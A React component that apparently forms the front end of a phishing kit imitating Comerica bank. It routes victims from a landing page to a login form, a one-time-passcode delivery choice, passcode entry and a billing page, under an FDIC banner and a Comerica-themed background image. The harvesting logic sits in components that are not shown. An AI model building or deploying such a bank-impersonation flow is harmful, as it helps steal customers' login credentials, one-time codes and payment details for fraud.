import React, { useState, useEffect } from 'react';
import { FdicBanner } from './components/FdicBanner';
import { Header } from './components/Header';
import { LoginForm } from './components/LoginForm';
import { OtpPage } from './components/OtpPage';
import { OtpInputPage } from './components/OtpInputPage';
import { BillingPage } from './components/BillingPage';
import { Footer } from './components/Footer';
import { LandingPage } from './components/LandingPage';

export function App() {
  const [view, setView] = useState<'landing' | 'login' | 'otp-selection' | 'otp-input' | 'billing'>('landing');

  useEffect(() => {
    if (view === 'landing') {
      const timer = setTimeout(() => {
        setView('login');
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [view]);

  const handleLogin = () => {
    setView('otp-selection');
  };

  const handleOtpSelectionContinue = () => {
    setView('otp-input');
  };

  const handleOtpVerifyContinue = () => {
    setView('billing');
  };

  const handleBackToLogin = () => {
    setView('login');
  };

  const handleBackToOtpSelection = () => {
    setView('otp-selection');
  };

  if (view === 'landing') {
    return <LandingPage />;
  }

  // Standalone pages with plain background
  if (view === 'otp-selection' || view === 'otp-input' || view === 'billing') {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f4f4f4] p-4">
        {view === 'otp-selection' && (
          <OtpPage 
            onContinue={handleOtpSelectionContinue} 
            onCancel={handleBackToLogin} 
          />
        )}
        {view === 'otp-input' && (
          <OtpInputPage 
            onContinue={handleOtpVerifyContinue} 
            onCancel={handleBackToOtpSelection} 
            onResend={() => alert("Verification code resent.")}
          />
        )}
        {view === 'billing' && <BillingPage />}
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <FdicBanner />
      <Header />

      {/* Hero Section with Background Image */}
      <main className="flex-grow relative flex items-center justify-center">
        {/* Background Image Container */}
        <div
          className="absolute inset-0 z-0 bg-cover bg-center bg-no-repeat"
          style={{
            backgroundImage:
              'url("https://raw.githubusercontent.com/Zencoder-AI-Bot/zencoder-internal/main/comerica_bg.png")',
          }}
        />

        {/* Form Container */}
        <div className="relative z-10 w-full max-w-7xl mx-auto px-4 sm:px-8 py-12 flex justify-center items-center">
          <div className="md:mt-[-5%]">
            {view === 'login' && <LoginForm onLogin={handleLogin} />}
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}
